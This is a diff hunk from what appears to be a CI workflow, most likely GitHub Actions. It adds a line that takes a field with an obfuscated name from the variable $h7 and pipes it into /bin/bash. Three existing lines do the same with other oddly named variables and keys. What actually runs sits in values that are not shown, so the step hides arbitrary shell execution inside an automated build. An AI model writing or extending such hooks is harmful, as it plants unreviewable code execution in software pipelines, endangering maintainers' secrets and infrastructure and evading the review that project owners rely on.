@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$po6" | jq -r .da92 | /bin/bash
           printf '%s' "$n55" | jq -r .v9802 | /bin/bash
           printf '%s' "$twwo0" | jq -r .qh077 | /bin/bash
+          printf '%s' "$h7" | jq -r .alze047 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
